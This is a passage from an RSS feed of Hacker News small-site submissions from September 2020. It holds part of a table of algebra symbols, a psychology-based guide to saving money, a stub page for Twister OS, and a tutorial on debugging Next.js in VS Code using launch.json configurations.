|z_2|$</td></tr><tr><td>$f(x)$, $g(x, y)$, $h(z)$</td><td><strong>Functions</strong></td><td>$g(f(x), 3) = h(x)$</td></tr><tr><td>$\mathbf{u}, \mathbf{v}, \mathbf{w}$<br>(or $\vec{u}, \vec{v}, \vec{w}$)</td><td><strong><a href="https://en.wikipedia.org/wiki/Euclidean_vector" target="_blank" aria-label="Vectors (opens in a new tab)" rel="noreferrer noopener">Vectors</a></strong></td><td>$2\mathbf{u} + 3\mathbf{v} = 5\mathbf{w}$</td></tr><tr><td>$U, V, W$</td><td><strong><a href="https://en.wikipedia.org/wiki/Vector_space" target="_blank" aria-label="Vector spaces (opens in a new tab)" rel="noreferrer noopener">Vector spaces</a></strong></td><td>$U$ is a subspace of vector space $V$.</td></tr><tr><td>$A, B, C$</td><td><strong><a href="https://en.wikipedia.org/wiki/Matrix_(mathematics)" target="_blank" aria-label="Matrices (opens in a new tab)" rel="noreferrer noopener">Matrices</a></strong></td><td>$AB \ne BA$</td></tr><tr><td>$\lambda$</td><td><strong><a href="https://en.wikipedia.org/wiki/Eigenvalues_and_eigenvectors#Formal_definition" target="_blank" aria-label="Eigenvalues (opens in a new tab)" rel="noreferrer noopener">Eigenvalues</a></strong></td><td>Since $A\mathbf{v_0}=3\mathbf{v_0}$, $3$ is an eigenvalue of $A$.</td></tr><tr><td>$G, H$</td><td><strong><a href="https://en.wikipedia.org/wiki/Group_(mathematics)#Definition" target="_blank" aria-label="Groups (opens in a new tab)" rel="noreferrer noopener">Groups</a></strong></td><td>There exists an element $e \in G$ such that for all $x \in G$, $x \circ e = x$.</td></tr><tr><td>$\mathbb{F}$</td><td><strong><a href="https://en.wikipedia.org/wiki/Field_(mathematics)" target="_blank" aria-label="Fields (opens in a new tab)" rel="noreferrer noopener">Fields</a></strong></td><td>A polynomial ring $\mathbb{F}[x]$ consists of polynomials with coefficients from field $\mathbb{F}$.</td></tr><tr><td>$X, Y$</td><td><strong><a href="https://en.wikipedia.org/wiki/Indeterminate_(variable)" target="_blank" aria-label="Indeterminates (opens in a new tab)" rel="noreferrer noopener">Indeterminates</a></strong></td><td>$3X^2Y + 5Y \in \\ \mathbb{Z}[X, Y]$</td></tr></tbody></table></figure><h2><span id="Delimiters"></span>Delimiters<span></span></h2><p>In mathematics, delimiters are symbols used to denote the separation between independent mathematical entities. The following table features some of the most common delimiters in algebra. For common delimiters in general, see <a href="https://mathvault.ca/hub/higher-math/math-symbols/common-math-symbols/#Delimiters" target="_blank" rel="noopener noreferrer">common delimiters</a>.</p><figure><table><thead><tr><th>Symbol Name</th><th>Explanation</th><th>Example</th></tr></thead><tbody><tr><td>$()$, $[]$, $\begin{pmatrix} x \\ y \\ z \end{pmatrix}$, $\begin{bmatrix} x &amp; y \\ w &amp; z\end{bmatrix}$</td><td><strong>Vectors/matrices indicators</strong></td><td>$\begin{pmatrix} 1 \\ 2 \\ 3 \end{pmatrix} +  \begin{pmatrix} 4 \\ 5 \\ 6 \end{pmatrix} = \\ \begin{pmatrix} 5 \\ 7 \\ 9 \end{pmatrix} $</td></tr><tr><td>$\{ \}$</td><td><strong>Set builder</strong></td><td>$\{ -1, 3.\overline{5}, \pi \} \in \mathbb{R}$</td></tr><tr><td>$\bigg\{$</td><td><strong><a href="https://en.wikipedia.org/wiki/Piecewise" target="_blank" aria-label="Piecewise-function (opens in a new tab)" rel="noreferrer noopener">Piecewise-function</a> indicator</strong></td><td>$|x| = \begin{cases} x &amp; x \ge 0 \\ -x &amp; x&lt;0 \end{cases}$</td></tr><tr><td>$:$, $\mid$</td><td><strong>“Such that” marker</strong></td><td>$\mathbb{Q} =$<br>$\displaystyle \left\{ \frac{x}{y} \,\middle|\, x \in \mathbb{Z}, y \in \mathbb{N} \right\}$</td></tr></tbody></table></figure><h2>Function-related Symbols<span></span></h2><p>As a foundational component of algebra, <strong>function</strong> plays a key role in establishing the rules pertaining to the manipulation of symbols. The following table documents some of the most common function-related operators and notational symbols — along with their meaning and example.</p><figure><table><thead><tr><th>Symbol Name</th><th>Explanation</th><th>Example</th></tr></thead><tbody><tr><td>$f : A \to B$,<br>$A \overset{f}{\to} B$</td><td><strong>Function mapping rule</strong><br>($f$ maps set $A$ to set $B$)</td><td>The function $f:\mathbb{N} \to \mathbb{R}$ with $f(x)=x^2$ is strictly increasing.</td></tr><tr><td>$f: x \mapsto y$,<br>$x \overset{f}{\mapsto} y$</td><td><strong>Function mapping rule</strong><br>($f$ maps element $x$ to element $y$)</td><td>The function $g: x \to x^3$ takes a number to its cube.</td></tr><tr><td>$\mathrm{dom}(f)$</td><td><strong><a href="https://en.wikipedia.org/wiki/Domain_of_a_function" target="_blank" aria-label="Domain (opens in a new tab)" rel="noreferrer noopener">Domain</a></strong> of $f$</td><td>$\mathrm{dom} (g) = \mathbb{R}_+$</td></tr><tr><td>$\mathrm{ran}(f)$</td><td><strong><a href="https://en.wikipedia.org/wiki/Range_of_a_function" target="_blank" aria-label="Range (opens in a new tab)" rel="noreferrer noopener">Range</a></strong> of $f$</td><td>If $\mathrm{ran} (f) = \mathbb{Z}$, then $f$ is an integer-valued function.</td></tr><tr><td>$f(x)$</td><td><strong><a href="https://en.wikipedia.org/wiki/Image_(mathematics)#Image_of_an_element" target="_blank" aria-label="Image of element (opens in a new tab)" rel="noreferrer noopener">Image of element</a></strong> $x$ under function $f$</td><td>$f(g(3)) = f(5) = 7$</td></tr><tr><td>$f(X)$</td><td><strong><a href="https://en.wikipedia.org/wiki/Image_(mathematics)#Image_of_a_subset" target="_blank" aria-label="Image of set (opens in a new tab)" rel="noreferrer noopener">Image of set</a> </strong>$X$ under function $f$</td><td>If $f(x) = \tan(x)$, then $f\left[ \left(-\frac{\pi}{2}, \frac{\pi}{2}\right) \right] = \mathbb{R}$</td></tr><tr><td>$f^{-1}(y)$</td><td><strong><a aria-label="Inverse function (opens in a new tab)" rel="noreferrer noopener" href="https://mathvault.ca/derivative-inverse-functions/#A_Primer_on_Inverse_Functions" target="_blank">Inverse function</a></strong> of $f$, <strong><a href="https://en.wikipedia.org/wiki/Image_(mathematics)#Inverse_image" target="_blank" aria-label="pre-image (opens in a new tab)" rel="noreferrer noopener">pre-image</a></strong> of element $y$ under function $f$</td><td>If $f$ is an <a href="https://mathvault.ca/math-glossary/#onetoone" target="_blank" aria-label="one-to-one (opens in a new tab)" rel="noreferrer noopener">one-to-one</a> function with $f(3)=5$, then $f^{-1}(5)=3$.</td></tr><tr><td>$f^{-1}(Y)$</td><td><strong><a href="https://en.wikipedia.org/wiki/Image_(mathematics)#Inverse_image" target="_blank" aria-label="Pre-image (opens in a new tab)" rel="noreferrer noopener">Pre-image</a></strong> of set $Y$ under function $f$</td><td>If $g: \mathbb{R} \to \mathbb{R}$ with $g(x)=x^2$, then $g^{-1}([0, 1]) = [-1, 1]$.</td></tr><tr><td>$f \circ g$</td><td><strong><a href="https://mathvault.ca/chain-rule-derivative/#Chain_Rule_A_Review" target="_blank" aria-label=" (opens in a new tab)" rel="noreferrer noopener">Composite function</a></strong> $f$ of $g$</td><td>If $f(x)=5x$ and $g(x)=x^3$, then $(f \circ g) (x) = 5x^3$.</td></tr><tr><td>$f |_A$</td><td><strong><a aria-label="Restriction (opens in a new tab)" href="https://en.wikipedia.org/wiki/Restriction_(mathematics)" target="_blank" rel="noreferrer noopener">Restriction</a></strong> of function $f$ to set $A$</td><td>$\mathrm{dom}(f |_A) =$<br>$A \cap \mathrm{dom}(f)$</td></tr><tr><td>$R \circ S$</td><td><strong><a aria-label="Composite relation (opens in a new tab)" href="https://en.wikipedia.org/wiki/Composition_of_relations" target="_blank" rel="noreferrer noopener">Composite relation</a></strong> $R$ of $S$</td><td>If $(1, 3) \in R$ and $(3, 6) \in S$, then $(1, 6) \in R \circ S$.</td></tr><tr><td>$R^{-1}$</td><td><strong><a aria-label="Inverse relation (opens in a new tab)" rel="noreferrer noopener" href="https://en.wikipedia.org/wiki/Converse_relation" target="_blank">Converse relation</a></strong> of $R$</td><td>$(x, y) \in R^{-1} \iff$<br>$(y, x) \in R$</td></tr><tr><td>$R^{+}$</td><td><strong><a href="https://en.wikipedia.org/wiki/Transitive_closure" target="_blank" aria-label="Transitive closure (opens in a new tab)" rel="noreferrer noopener">Transitive closure</a></strong> of relation $R$</td><td>For all transitive relations $T$ containing $R$, $R^{+} \subseteq T$.</td></tr></tbody></table></figure><h2><span id="Operators"></span>Operators<span></span></h2><p>In algebra, <strong>operators</strong> can be thought of as a special type of function mapping one or multiple mathematical entities to another, and are often given special names or notations due to their repeated occurrences.</p><p>In particular, these operators are often related to <strong>numbers</strong>, <strong>key functions</strong>, <strong>linear algebra</strong> and <strong>abstract algebra</strong> — the vast majority of which are found in the tables below. For common operators in general, see <a href="https://mathvault.ca/hub/higher-math/math-symbols/common-math-symbols/#Operators" target="_blank" rel="noopener noreferrer">common operators</a>.</p><h3>Number-related Operators<span></span></h3><figure><table><thead><tr><th>Symbol Name</th><th>Explanation</th><th>Example</th></tr></thead><tbody><tr><td>$\gcd (x,y)$</td><td><strong><a href="https://en.wikipedia.org/wiki/Greatest_common_divisor" target="_blank" aria-label="Greatest common divisor (opens in a new tab)" rel="noreferrer noopener">Greatest common divisor</a></strong> of $x$ and $y$</td><td>$\gcd (20, 15) = 5$</td></tr><tr><td>$\mathrm{lcm} (x, y)$</td><td><strong><a href="https://en.wikipedia.org/wiki/Least_common_multiple" target="_blank" aria-label="Least common multiple (opens in a new tab)" rel="noreferrer noopener">Least common multiple</a></strong> of $x$ and $y$</td><td>$\mathrm{lcm} (x, y) = \dfrac{xy}{\gcd (x, y)}$</td></tr><tr><td>$x \bmod y$</td><td><strong><a aria-label=" (opens in a new tab)" rel="noreferrer noopener" href="https://mathvault.ca/long-division/#Euclidean_Division_Terminology" target="_blank">Remainder</a></strong> of $x$ when divided by $y$</td><td>$23 \bmod 4 = 3$</td></tr><tr><td>$|x|$</td><td><strong>Absolute value</strong> of $x$</td><td>$|-5| = |5| = 5$</td></tr><tr><td>$\lfloor x \rfloor$</td><td><strong><a href="https://en.wikipedia.org/wiki/Floor_and_ceiling_functions" target="_blank" aria-label="Floor (opens in a new tab)" rel="noreferrer noopener">Floor</a></strong> of $x$</td><td>$\lfloor 5.999 \rfloor = 5$</td></tr><tr><td>$\lceil x \rceil$</td><td><strong><a href="https://en.wikipedia.org/wiki/Floor_and_ceiling_functions" target="_blank" aria-label="Ceiling (opens in a new tab)" rel="noreferrer noopener">Ceiling</a></strong> of $x$</td><td>For all $x \in \mathbb{R}$,  $\lceil x \rceil-1 &lt; x \le \lceil x \rceil$.</td></tr><tr><td>$\lfloor x \rceil$, $\mathrm{round}(x)$</td><td><strong><a href="https://mathworld.wolfram.com/NearestIntegerFunction.html" target="_blank" aria-label="Nearest integer (opens in a new tab)" rel="noreferrer noopener">Nearest integer</a></strong> of $x$</td><td>$\mathrm{round}(3.5) =4$</td></tr><tr><td>$\max (A)$</td><td><strong>Maximum </strong>of set $A$</td><td>$\max \left( \{3, 11, 5 \}\right) = 11$</td></tr><tr><td>$\min (A)$</td><td><strong>Minimum</strong> of set $A$</td><td>For all $x \in A$, $\min (A) \le x$.</td></tr><tr><td>$\displaystyle \sum_{i=1}^{n} a_i$, $ \displaystyle \sum_{(i, j) = (1, 1)}^{(m, n)} a_{ij}$, $\displaystyle \sum_{i \in I} a_i$</td><td><strong><a href="https://en.wikipedia.org/wiki/Summation#Notation" target="_blank" aria-label="Sum (opens in a new tab)" rel="noreferrer noopener">Sum</a></strong> of $a_i$/$a_{ij}$</td><td>$\displaystyle \sum_{(i, j) = (1, 1)}^{(5, 5)} \frac{i+j}{2} \ge 15$</td></tr><tr><td>$\displaystyle \prod_{i=1}^n a_i$, $ \displaystyle \prod_{(i, j) = (1, 1)}^{(m, n)} a_{ij}$,  $\displaystyle \prod_{i \in I} a_i$</td><td><strong><a href="https://en.wikipedia.org/wiki/Multiplication#Capital_pi_notation" target="_blank" aria-label="Product (opens in a new tab)" rel="noreferrer noopener">Product</a></strong> of $a_i$/$a_{ij}$</td><td>$\displaystyle \prod_{i \in \{ 3, 5, 7\} } (i^2-1) =$<br>$8 \cdot 24 \cdot 48$</td></tr></tbody></table></figure><h3><span id="Key_Functions"></span>Key Functions<span></span></h3><figure><table><thead><tr><th>Symbol Name</th><th>Explanation</th><th>Example</th></tr></thead><tbody><tr><td>$k_n x^n + \cdots + k_0 x^0$</td><td><strong><a href="https://mathvault.ca/polynomial-infinity/#Polynomials_A_Review" target="_blank" aria-label="Polynomial (opens in a new tab)" rel="noreferrer noopener">Polynomial</a></strong> of degree $n$ with coefficients $k_0, \ldots, k_n$</td><td>$2x^3 (x+1) = $<br>$2x^4 + 2x^3$</td></tr><tr><td>$e^x, \exp x$</td><td><strong><a href="https://en.wikipedia.org/wiki/Exponential_function" target="_blank" aria-label="Natural exponential function (opens in a new tab)" rel="noreferrer noopener">Natural exponential function</a></strong></td><td>For all $x \ge 3$, $e^x \ge 20$.</td></tr><tr><td>$b^x$</td><td><strong><a href="https://en.wikipedia.org/wiki/Exponential_function" target="_blank" aria-label="Exponential function (opens in a new tab)" rel="noreferrer noopener">Exponential function</a></strong> with base $b$</td><td>$2^{x+y} = 2^x \cdot 2^y$</td></tr><tr><td>$\ln x$</td><td><strong><a href="https://mathvault.ca/logarithm-theory/#Natural_Logarithm_Base_e" target="_blank" aria-label="Natural logarithmic function (opens in a new tab)" rel="noreferrer noopener">Natural logarithmic function</a></strong></td><td>$\ln 10 = \ln 2 + \ln 5$</td></tr><tr><td>$\log x$</td><td><strong><a aria-label="Common logarithmic function (opens in a new tab)" href="https://mathvault.ca/logarithm-theory/#Common_Logarithm_Base_10" target="_blank" rel="noreferrer noopener">Common logarithmic function</a></strong></td><td>$\log 1000000 = 6$</td></tr><tr><td>$\log_b x$</td><td><strong><a href="https://en.wikipedia.org/wiki/Logarithm" target="_blank" aria-label="Logarithmic function (opens in a new tab)" rel="noreferrer noopener">Logarithmic function</a></strong> of base $b$</td><td>$\log_{11} 23 = \dfrac{\ln 23}{\ln 11}$</td></tr><tr><td>$\sin x$, $\cos x$, $\tan x$, $\sec x$, $\csc x$, $\cot x$</td><td>6 <strong><a href="https://mathvault.ca/hub/higher-math/math-symbols/geometry-trigonometry-symbols/#Trigonometric_Functions" target="_blank" aria-label=" (opens in a new tab)" rel="noreferrer noopener">trigonometric functions</a></strong> (sine, cosine, tangent, secant, cosecant, cotangent)</td><td>$\csc x = \dfrac{1}{\sin x}$</td></tr><tr><td>$\arcsin(x)$, $\sin^{-1}(x)$, $\arccos(x)$, $\cos^{-1}(x)$, $\arctan(x)$, $\tan^{-1}(x)$</td><td><strong><a aria-label="Inverse trigonometric functions (opens in a new tab)" href="https://en.wikipedia.org/wiki/Inverse_trigonometric_functions" target="_blank" rel="noreferrer noopener">Inverse trigonometric functions</a></strong> (inverse sine, inverse cosine, …</td></tr></tbody></table></figure></section></div></div></div></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://mathvault.ca/hub/higher-math/math-symbols/algebra-symbols/">https://mathvault.ca/hub/higher-math/math-symbols/algebra-symbols/</a></em></p>]]>
            </description>
            <link>https://mathvault.ca/hub/higher-math/math-symbols/algebra-symbols/</link>
            <guid isPermaLink="false">hacker-news-small-sites-24528969</guid>
            <pubDate>Sat, 19 Sep 2020 17:18:28 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[How to Save Money]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24528822">thread link</a>) | @electricant
<br/>
September 19, 2020 | https://psyche.co/guides/how-to-save-a-psychological-approach-to-better-spending-and-saving | <a href="https://web.archive.org/web/*/https://psyche.co/guides/how-to-save-a-psychological-approach-to-better-spending-and-saving">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><section><div><h2 data-guide-section-number="1"><span>Need to know</span></h2><div><p>People save for a variety of reasons: to put money by for unforeseen contingencies; for retirement; for holidays or other expensive purchases; to leave money for a spouse or children after death; to avoid debt. Others save only because they think it is a good idea or that they â€˜ought toâ€™. Whatever the motive, saving not only has financial benefits, it can also improve <a href="https://www.sciencedirect.com/science/article/abs/pii/S0167487011001231">psychological wellbeing</a> and <a href="https://link.springer.com/article/10.1007/s00038-019-01214-3">emotional health</a>.</p>
<p>Of course, not everyone is in a position to save, particularly right now â€“ for people with significant debt, living on minimum wages or chronically unemployed, saving is not a realistic priority. Yet for those who do have the means to save, and given its benefits, why do so few of us do it?</p>
<p>For instance, in the United Kingdom in 2019, of more than 27 million households, nearly 13 million had no savings at all, <a href="https://themoneycharity.org.uk/media/March-2020-Money-Statistics.pdf">according</a> to the Money Charity. So, approximately half of all Britons have no money of their own to fall back on or to use either short- or long-term. In the United States, average personal saving rates (the amount of disposable income that people put by) were around 7.6 per cent in 2019, and even below 5 per cent in the decade prior, which is significantly less than required to retire comfortably, according to financial commentators.</p>
<p>There are countless articles and advice columns available online that will tell you why you need to save and that teach you the basic practicalities of saving â€“ such as how to compare interest rates or where to find the banking apps that allow you to partition your money into virtual savings pots. The trouble is, such advice fails to address the fundamental psychological reasons that impede so many peopleâ€™s intentions to save. In this Guide, weâ€™ll take you through these psychological hurdles and show you how to overcome them.</p>
<p>Underlying many of our difficulties with saving is that we evolved to cope with short-term, usually physical, threats and to prioritise satisfying our most immediate needs. For instance, rather than responding to a threatening letter from your credit card company with a long-term saving strategy, it is all too easy to react instead as you would to an acute physical threat â€“ to run, fight or freeze. These automatic survival responses narrow attention on the threat and speed up short-term decision-making at the expense of longer-term strategy. But you canâ€™t run from or kill the creditor. Likewise, freezing and hoping that the threat will go away might have saved your distant ancestor from a physical predator, but it wonâ€™t work with your bank.</p>
<p>Itâ€™s partly because of these evolved survival mechanisms that, rather than planning ahead, so many people take out instant â€˜payday loansâ€™ with punitive interest rates to tide them over until the next pay cheque. To the stressed or scared brain, such loans can seem like a good survival option, but in reality they are a long-term financial disaster.</p>
<p>We also evolved to attract mates. Status was (and still can be) a good attractor, so it might be very tempting to buy shiny things to show off, such as a new phone (despite your existing one being adequate) or new clothes and shoes (although you might not wear half the stuff you already own). Left unchecked, these impulses to keep purchasing new and impressive items can also thwart any intentions to save.</p>
<p>Youâ€™re more likely to become a successful saver and to overcome your unhelpful evolved tendencies if you do three things: take the time to consider what your overarching values and long-term goals are in life; develop a sense of balance (allowing you to weigh your current needs against your future plans); and build new monetary habits, so that saving is no longer a constant battle or test of willpower, but something you do automatically.</p>
<p>If youâ€™re in a position to save, you might feel that the middle of a pandemic, with uncertainty high and many salaries falling, is not the right time to pay attention to saving. Thatâ€™s understandable, but our advice about identifying your priorities and finding ways to make better use of the money you have is arguably more important than ever.</p></div></div></section><section><div><h2 data-guide-section-number="2"><span>What to do</span></h2><div><p>To increase your chances of saving successfully, the first thing you need to do is to define what matters to you â€“ in other words, your values. What are you saving <em>for</em>? When it comes to your behaviour, your <a href="https://doi.org/10.1177/0956797612439069">motivation</a> is far more important to initiating change than your energy levels. Imagine youâ€™re hiking in the woods and become so tired that you feel like you canâ€™t take another step. If a bear appears and goes for you, donâ€™t you think you could run a bit more, let alone walk again? Motivation is just as critical when it comes to saving money, so think about what matters to you. Maybe youâ€™d like to run your own business, start a charity, or simply have enough money to go away next year? These are the kind of meaningful, long-term goals that you need to have at the forefront of your mind if you are to overcome short-term temptations and find the motivation to save money.</p>
<p>If youâ€™re struggling to figure out what you <em>really</em> want in the long-term (and what you want your money to do for you), there are several thought experiments you can try. Research <a href="https://journals.plos.org/plosone/article?id=10.1371/journal.pone.0079407">suggests</a> that contemplating death can alter your financial priorities. Imagine that youâ€™ve died and that your life is being commemorated on the news: what would you like your significant achievements or experiences to have been? Or imagine youâ€™re nearing death: what would the future â€˜youâ€™ tell the current â€˜youâ€™ about what was actually important? These thought experiments are good for working out what youâ€™ll regret if you donâ€™t get started on longer-term goals, but death can be a bit depressing. An alternative is to imagine appearing on a TV show with your favourite interviewer in 15 to 20 yearsâ€™ time. What would you like to say youâ€™re grateful for â€“ what were your greatest achievements, or your happiest, most meaningful moments?</p>
<p>When youâ€™ve got a goal or value, picture it. The more detail the better. Draw it, describe it, get a clear image of it. Then get some of those little sticky dots you can find in stationery stores. Put one on the picture, or on your computer, phone, TV, mirror. Make sure you keep in mind why youâ€™re doing what youâ€™re doing. Then, when you get out your credit card to buy something, or look at your phone to pay online, youâ€™ll see the dot, think about why youâ€™re saving and how great that goal or value is, and wonâ€™t spend the money. Youâ€™ll use your dreams and motivations to change your behaviour and, each time you do, youâ€™ll take a step towards that day when youâ€™ll have achieved what youâ€™d like to celebrate in your fantasy TV interview.</p>
<p>The next thing you need to do is to create a sense of balance between your immediate needs and your more optional or discretionary desires, so that you stay happy and motivated while also having enough resources left over to put toward your overarching, long-term values and aims.</p>
<p>Only you know the things you absolutely must have (apart from food and shelter, and ideally companionship). But do bear in mind that, if youâ€™re completely honest with yourself, most material things are really optional â€“ you might think you must have the dozens of things your grandparents had never even heard of, such as dishwashers, wireless headphones, instantaneous, unlimited internet and a phone with a teleport app. Yet you donâ€™t. You need essentials for life, the rest you have to prioritise, and your priorities are up to you.</p>
<p>One important thing to consider is that there are times in life when itâ€™s unwise to save. For example, itâ€™s better to clear high-interest debt, such as credit cards, first. There is little point in putting aside savings at a 2 per cent interest rate if youâ€™re simultaneously paying 20 per cent interest or more on your credit card debt. That might sound obvious, but in the UK in 2019 credit card debt <a href="https://themoneycharity.org.uk/money-statistics/?gclid=CjwKCAjwkun1BRAIEiwA2mJRWZnvjJxcJXuKA4Cmkm8KJYTbZ63tTZiYMmXdVocn0O2F-c7LG38SrRoCObYQAvD_BwE">averaged</a> Â£2,591 per household, so itâ€™s not as obvious as it should be.</p>
<p>An inappropriate savings habit can be as bad as an inappropriate spending habit, the key is balance and planning</p>
<p>Similarly, itâ€™s all too common for people to save while neglecting urgent essentials. Consider the case of pre-pandemic winter-related deaths among people aged 65 and over â€“ which in the UK are around 379 per day in excess of the rest of the year, <a href="https://www.ageuk.org.uk/latest-press/articles/2018/november/response-to-new-excess-winter-death-figures/">according</a> to the charity Age UK, due largely to increases in respiratory illness, especially pneumonia. Yes, poor conditions, poverty and seasonal viruses play a role, but weâ€™ve also heard many stories of people continuing to try to save rather than spending sufficient money on vital heating. A lifelong habit of saving can be dangerous, when the more appropriate action is spending on self-protection.</p>
<p>Another reason that balance is so important in choosing how much, when and what to save for is that living like a monk through force of habit rather than conscious choice is actually bad for wellbeing. An inappropriate savings habit can be as bad as an inappropriate spending habit, the key is balance and planning. After all, if life under your new saving regime is too dull and arduous, youâ€™re unlikely to keep to it. So remember to set exciting short-term goals along the path to your big dreams (such as clearing out the garage to use as an office, and selling the junk to use as starting capital). And do make sure to reward yourself from time to time â€“ buy some music you love or something else that gives you joy, to celebrate your progress when you stick to your new plans.</p>
<p>To help find the balance in your spending priorities, try this exercise: imagine youâ€™ve won Â£25 million in the lottery. Write down the first 15 things youâ€™d buy in as much detail as you can. Next, read through the list (you can do this alone, or with a trusted friend) and consider where the desires came from. Categorise them: which items are driven by expectations (â€˜if Iâ€™m …</p></div></div></section></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://psyche.co/guides/how-to-save-a-psychological-approach-to-better-spending-and-saving">https://psyche.co/guides/how-to-save-a-psychological-approach-to-better-spending-and-saving</a></em></p>]]>
            </description>
            <link>https://psyche.co/guides/how-to-save-a-psychological-approach-to-better-spending-and-saving</link>
            <guid isPermaLink="false">hacker-news-small-sites-24528822</guid>
            <pubDate>Sat, 19 Sep 2020 17:01:22 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Twister OS: Make Raspberry Pi Look Like Windows or macOS]]>
            </title>
            <description>
<![CDATA[
Score 138 | Comments 49 (<a href="https://news.ycombinator.com/item?id=24528732">thread link</a>) | @yboris
<br/>
September 19, 2020 | https://twisteros.com/index.html | <a href="https://web.archive.org/web/*/https://twisteros.com/index.html">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><p>Twister OS 2020 | <a href="https://discord.gg/Fh8sjmu" target="_blank">Join our Discord!</a></p></div></div>]]>
            </description>
            <link>https://twisteros.com/index.html</link>
            <guid isPermaLink="false">hacker-news-small-sites-24528732</guid>
            <pubDate>Sat, 19 Sep 2020 16:50:54 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Debugging Next.js]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24528681">thread link</a>) | @lazar_nikolov
<br/>
September 19, 2020 | https://nikolovlazar.com/debugging-nextjs | <a href="https://web.archive.org/web/*/https://nikolovlazar.com/debugging-nextjs">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><section itemprop="articleBody mainEntityOfPage"><meta itemprop="thumbnailUrl image" content="https://cdn.hashnode.com/res/hashnode/image/upload/v1600534200717/rO1es5pbF.png?w=1600&amp;h=840&amp;fit=crop&amp;crop=entropy&amp;auto=format&amp;q=60"><div><div itemprop="text"><h2 id="what-is-nextjs">What is Next.JS</h2>
<p><a target="_blank" href="https://nextjs.org/">Next.JS</a> is an amazing React framework created by <a target="_blank" href="https://vercel.com/">Vercel</a>. It allows the developers to create Server-side, Client-side or Static websites. Unlike the other frameworks, the rendering in Next JS is <strong>per page</strong>. That means, the "about" page can be static, while the "home" page can be server-side. Next JS is on the rise, loved by the developers, and my favorite React framework so far.</p>
<blockquote>
<p>If you want to learn more about website rendering, read my other post <a target="_blank" href="https://nikolovlazar.com/how-to-render-your-website">here</a>.</p>
</blockquote>
<h2 id="environment">Environment</h2>
<p>This article covers the debugging process using <a target="_blank" href="https://code.visualstudio.com/">Visual Studio Code</a>. You can use the same commands in other IDEs, but you need to write them in the specific format.</p>
<p>For simplicity, we will use <a target="_blank" href="https://github.com/lazarnikolov94/debugging-nextjs">this repo</a> to show the debugging process. So, go ahead and clone it on your computer, execute <code>yarn install</code> and open it in Visual Studio Code.</p>
<h2 id="debugging-nextjs">Debugging Next.JS</h2>
<p>A Next.JS page has two parts: a server-side part and a client-side part. To debug both parts you will need two VSCode launch tasks. Let's dive in.</p>
<h2 id="debugging-the-server-side">Debugging the Server-side</h2>
<p>The server-side code lives in the <code>getServerSideProps</code> method. It executes every time there's a request. To debug the server-side code we will need to add a new VSCode launch task. First, create a <code>.vscode</code> folder in the root of the project, and then inside that folder create a <code>launch.json</code> file. We will add our launch tasks here.</p>
<p>Inside the <code>launch.json</code> file add a new "Node: Launch Program" configuration. Then, you will need to add the following changes:</p>
<ul>
<li>Remove the <code>skipFiles</code> property</li>
<li>Remove the <code>program</code> property</li>
<li>Add a new property <code>runtimeExecutable</code> with value <code>${workspaceFolder}/node_modules/.bin/next</code></li>
</ul>
<p>Your <code>launch.json</code> file should look something like this:</p>
<pre><code>{
    <span>"configurations"</span>: [
        {
            <span>"type"</span>: <span>"pwa-node"</span>,
            <span>"request"</span>: <span>"launch"</span>,
            <span>"name"</span>: <span>"Next: Node"</span>,
            <span>"runtimeExecutable"</span>: <span>"${workspaceFolder}/node_modules/.bin/next"</span>
        }
    ]
}
</code></pre>
<p>That's it! Now open the <code>/pages/[owner]/[repo].tsx</code> file, add a breakpoint on line 32 and hit F5. When the Next.JS server starts navigate to <a target="_blank" href="http://localhost:3000/">http://localhost:3000</a> and click on one of the repos in the list. After clicking it, you should hit the breakpoint. Now you have the ability to inspect the <code>ctx</code> argument and the data received from GitHub's API.</p>
<h2 id="debugging-the-client-side">Debugging the Client-side</h2>
<p>To debug the Client-side first you need to install the <a target="_blank" href="https://marketplace.visualstudio.com/items?itemName=msjsdiag.debugger-for-chrome">Debugger for Chrome</a> extension. Open the link and click on the Install button. It will ask you to open the link in Visual Studio Code, so click on the "Open Visual Studio Code" button.</p>
<p>As I mentioned above, you will need two launch tasks, so let's create the client-side one. Head to <code>launch.json</code> and add a new "Chrome: Launch" task. Then, you will only need to make one change:</p>
<ul>
<li>Change the <code>url</code> value to <code>http://localhost:3000</code></li>
</ul>
<p>Your complete <code>launch.json</code> file should look something like this:</p>
<pre><code>{
    <span>"configurations"</span>: [
        {
            <span>"name"</span>: <span>"Launch Chrome"</span>,
            <span>"request"</span>: <span>"launch"</span>,
            <span>"type"</span>: <span>"pwa-chrome"</span>,
            <span>"url"</span>: <span>"http://localhost:3000"</span>,
            <span>"webRoot"</span>: <span>"${workspaceFolder}"</span>
        },
        {
            <span>"type"</span>: <span>"pwa-node"</span>,
            <span>"request"</span>: <span>"launch"</span>,
            <span>"name"</span>: <span>"Next: Node"</span>,
            <span>"runtimeExecutable"</span>: <span>"${workspaceFolder}/node_modules/.bin/next"</span>
        }
    ]
}
</code></pre>
<p>And that's it! Now, open the <code>/pages/index.tsx</code> file and add a breakpoint on line 9. You can now launch the Launch Chrome task from the debug panel. The Launch Chrome task should open a new Chrome window on the home page. Start typing into the input on the screen and you will hit the breakpoint in the <code>index.tsx</code> file. Now you have the ability to inspect the client-side properties, like the <code>repo</code> variable. Click continue and type another letter. You will hit the breakpoint every time you type something in the input. Hover on the <code>repo</code> variable to see the value changing. You're now debugging the client-side code!</p>
<h2 id="conclusion">Conclusion</h2>
<p>Now you know how to debug both sides in a Next.JS app. The server side code is node, so you need a Node debug task for it. The client side is Chrome, so you need a Chrome debug task for it.</p>
<p>Also, debugging is a vital process in software engineering, so use it everywhere you can! Don't use only <code>console.log</code> for debugging.</p>
</div></div></section></div></div>]]>
            </description>
            <link>https://nikolovlazar.com/debugging-nextjs</link>
            <guid isPermaLink="false">hacker-news-small-sites-24528681</guid>
            <pubDate>Sat, 19 Sep 2020 16:43:01 GMT</pubDate>
        </item>
